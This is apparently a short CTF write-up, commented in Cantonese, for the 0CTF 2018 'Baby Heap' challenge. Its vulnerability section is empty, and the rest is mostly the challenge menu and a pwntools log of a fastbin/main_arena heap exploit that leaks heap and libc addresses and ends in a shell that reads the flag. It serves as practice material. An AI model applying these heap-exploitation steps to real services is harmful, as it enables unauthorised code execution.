# Baby Heap 2018 - 183pts

題目:
>
>Let's practice the very basic [heap](babyheap.tar.gz) techniques in 2018!
>
>202.120.7.204:127


Menu:

```
   / //_// ____/ ____/ | / /  / /   /   |  / __ )
  / ,<  / __/ / __/ /  |/ /  / /   / /| | / __  |
 / /| |/ /___/ /___/ /|  /  / /___/ ___ |/ /_/ /
/_/ |_/_____/_____/_/ |_/  /_____/_/  |_/_____/

===== Baby Heap in 2018 =====
1. Allocate
2. Update
3. Delete
4. View
5. Exit
Command: 
```

呢條係經典嘅heap題目,有齊 allocate, update, delete, view

vulnerability:




# Flag

```
flag{have_fun_with_fastbin}
```

logs:
```
# [+] Opening connection to 202.120.7.204 on port 127: Done
# [*] '/root/Desktop/CTF_Game/0ctf_2018/baby_heap/libc.so.6'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] Leaking heap addr
# [*] Leaked heap addr :0x562ecd700000
# [*] Leaking libc
# [*] Leaked libc :0x7f58a9390b58
# [*] Leaked libc base :0x7f58a8ff7000
# [*] __malloc_hook : 0x7f58a9390af0
# [*] __free_hook : 0x7f58a9392788
# [*] main_arena : 0x7f58a9390b00
# [*] main_arena : 0x7f58a9390b00
# [*] Hijacking main_arena
# 73
# [*] removing old 0x20 to clean up the list
# [*] starting attack :)
# [*] Switching to interactive mode
# Chunk 9 Updated
# 1. Allocate
# 2. UpdateSize: total 84
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 .
# drwxr-xr-x  22 root root  4096 Mar 14 09:48 ..
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 bin
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 boot
# drwxr-xr-x  16 root root  2960 Mar 14 14:37 dev
# drwxr-xr-x  77 root root  4096 Mar 30 19:21 etc
# drwxr-xr-x   3 root root  4096 Mar 30 19:16 home
# lrwxrwxrwx   1 root root    29 Mar 14 09:48 initrd.img -> boot/initrd.img-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    29 Mar 14 09:35 initrd.img.old -> boot/initrd.img-4.9.0-4-amd64
# drwxr-xr-x  14 root root  4096 Mar 14 09:40 lib
# drwxr-xr-x   2 root root  4096 Mar 28 21:47 lib64
# drwx------   2 root root 16384 Mar 14 09:35 lost+found
# drwxr-xr-x   3 root root  4096 Mar 14 09:35 media
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 mnt
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 opt
# dr-xr-xr-x 101 root root     0 Mar 14 14:37 proc
# drwx------   4 root root  4096 Mar 31 06:27 root
# drwxr-xr-x  17 root root   580 Mar 31 11:05 run
# drwxr-xr-x   2 root root  4096 Mar 30 19:15 sbin
# drwxr-xr-x   2 root root  4096 Mar 14 09:35 srv
# dr-xr-xr-x  13 root root     0 Mar 31 11:43 sys
# drwx-wx-wt   8 root root  4096 Apr  1 02:17 tmp
# drwxr-xr-x  10 root root  4096 Mar 14 09:35 usr
# drwxr-xr-x  11 root root  4096 Mar 14 09:35 var
# lrwxrwxrwx   1 root root    26 Mar 14 09:48 vmlinuz -> boot/vmlinuz-4.9.0-6-amd64
# lrwxrwxrwx   1 root root    26 Mar 14 09:35 vmlinuz.old -> boot/vmlinuz-4.9.0-4-amd64
# $ cat flag
# cat: flag: No such file or directory
# $ cd home
# $ ls
# babyheap
# $ cd babyheap
# $ cat flag
# flag{have_fun_with_fastbin}
# [*] Got EOF while reading in interactive
# $  
```
